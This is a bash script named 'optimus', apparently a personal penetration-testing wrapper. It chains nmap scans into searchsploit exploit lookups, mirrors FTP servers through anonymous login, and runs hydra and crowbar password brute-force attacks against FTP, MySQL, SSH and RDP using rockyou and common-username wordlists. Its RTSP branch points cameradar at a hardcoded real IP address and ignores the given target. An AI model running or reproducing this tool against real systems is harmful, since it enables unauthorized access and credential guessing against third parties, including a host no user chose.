#!/usr/bin/bash

#Flags:

#The u: means u will need a value if called
#Example for 4 flags parameters:

users="/root/Documents/Attacks/Bruteforce/commonUserShort.txt"
passwords="/root/Documents/Attacks/Bruteforce/rockyou-50.txt"

orange='\033[93m' 

while getopts t:r:p:hfl: option
do
	case "${option}"
		in
		t) host=${OPTARG};;
		r) protocol=${OPTARG};;
		p) port=${OPTARG};;
		l) threads=${OPTARG};;
		f) full="true";;
		h)  echo -e "$orange\nusage: optimus [-t host/ip][-r protocol][-p port][-l treads], -h for help
Options -f - full scan

Currently supported protocols: 
ftp
mysql
rtsp
ssh
use 'host' protocol to specify full vulnscan\n

The following protocols arent complete:

rdp\n
" && exit

	esac
done

# nmap stuff 

mkdir optimus_nmap

##########################################################################################################################################################

# HOST + # General cross protocol check

if [ "$protocol" == "host" ]
then

	nmap $host -p- -sV -A -Pn -oA optimus_nmap/optimus_nmap_$protocol_$port 

	searchsploit --nmap optimus_nmap/optimus_nmap_$protocol_$port.xml -v 
else
	
	nmap $host -p $port -sV -A -Pn -oA optimus_nmap/optimus_nmap_$protocol_$port 

	searchsploit --nmap optimus_nmap/optimus_nmap_$protocol_$port.xml -v 

fi

##########################################################################################################################################################

# RTSP

#HTTP like streaming protocol
#cameradar brute forces paths and credentials

if [ "$protocol" == "rtsp" ]
then

	docker pull ullaakut/cameradar
	docker run -t ullaakut/cameradar -t 69.164.139.18 -p $port -s 3 -T 6s -d
	
fi

# python rtsp_authgrind [- l username | -L username list file] [-p password 
# | -P password list file] <target ip [:port]> for possible full feature/when have user pass list

##########################################################################################################################################################

# FTP

#Anonymoius logon+
#file pulling
#Bruteforce


if [ "$protocol" == "ftp" ]
then

	wget -m ftp://anonymous:anonymous@$host --no-passive

	if [ "$full" == "true" ]
	then
# Hydra bruteforce
		hydra -L $users -P $passwords -t $threads  $protocol://$host:$port -vvv
	fi
fi

##########################################################################################################################################################

# MYSQL

#Bruteforce

if [ "$protocol" == "mysql" ]
then

	echo "In mysql we can only do bruteforce beyond the vuln scan, use -f to run brute force"

	if [ "$full" == "true" ]
	then
#Hydra bruteforce
		hydra -L $users -P $passwords -t $threads  $protocol://$host:$port -vvv
	fi
fi


##########################################################################################################################################################

# SSH

#Bruteforce only atm

if [ "$protocol" == "ssh" ]
then

	echo "In ssh we can only do bruteforce beyond the vuln scan, use -f to run brute force"

	if [ "$full" == "true" ]
	then
#Hydra bruteforce
		hydra -L $users -P $passwords -t $threads  $protocol://$host:$port -vvv
	fi
fi

##########################################################################################################################################################

# RDP

#Bruteforce only atm

if [ "$protocol" == "rdp" ]
then

	echo "In rdp we can only do bruteforce beyond the vuln scan, use -f to run brute force, use the x.x.x.x/32 as target\n
	The default user is administrator."

	if [ "$full" == "true" ]
	then
#crowbar bruteforce

		crowbar -b rdp -s  $host -u administrator -C $passwords
	fi
fi
